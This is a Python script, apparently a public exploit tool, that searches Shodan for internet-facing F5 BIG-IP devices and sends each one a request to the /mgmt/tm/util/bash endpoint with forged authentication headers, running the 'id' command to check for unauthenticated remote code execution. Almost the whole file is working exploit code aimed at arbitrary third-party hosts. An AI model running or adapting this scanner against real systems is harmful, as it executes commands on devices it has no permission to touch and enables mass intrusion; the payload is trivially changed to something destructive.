from colorama import Fore
import shodan
import requests 
import json
import urllib3

"""

███████╗ ██╗██╗   ██╗██████╗     ███████╗ ██████╗██╗  ██╗███╗   ██╗
██╔════╝███║██║   ██║╚════██╗    ██╔════╝██╔════╝██║  ██║████╗  ██║
█████╗  ╚██║██║   ██║ █████╔╝    ███████╗██║     ███████║██╔██╗ ██║
██╔══╝   ██║╚██╗ ██╔╝ ╚═══██╗    ╚════██║██║     ╚════██║██║╚██╗██║
██║      ██║ ╚████╔╝ ██████╔╝    ███████║╚██████╗     ██║██║ ╚████║
╚═╝      ╚═╝  ╚═══╝  ╚═════╝     ╚══════╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝
                                                       by c0deninja

"""

SHODAN_API_KEY = ""
api = shodan.Shodan(SHODAN_API_KEY)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    'Content-Type': 'application/json',
    'Connection': 'keep-alive, x-F5-Auth-Token',
    'X-F5-Auth-Token': 'abc',
    'Authorization': 'Basic YWRtaW46'
}
data = {'command': "run",'utilCmdArgs':"-c id"}
try:
    results = api.search('http.title:"BIG-IP&reg;-+Redirect" +"Server" product:"F5 BIG-IP"')
    ips = []
    for result in results['matches']:
        ips.append(result['ip_str'])
        with open("f5bigip.txt", "w") as f:
            for ip_address in ips:
                f.writelines(f"{ip_address}\n")
    with open("f5bigip.txt", "r") as get_ips:
        f5bigips_list = [x.strip() for x in get_ips.readlines()]
        for f5_list in f5bigips_list:
            try:
                response = requests.post(url=f"https://{f5_list}/mgmt/tm/util/bash", json=data, headers=headers, verify=False, timeout=5)
                if response.status_code == 200 and 'commandResult' in response.text:
                    print(f"{Fore.GREEN}VULNERABLE: {Fore.CYAN}https://{f5_list}")
                else:
                    print(f"{Fore.RED}NOT VULNERABLE: https://{f5_list}")
            except requests.exceptions.SSLError:
                pass
            except urllib3.exceptions.MaxRetryError:
                pass
            except requests.exceptions.ConnectTimeout:
                pass
            except requests.exceptions.ReadTimeout:
                pass
except shodan.APIError as e:
        print('Error: {}'.format(e))
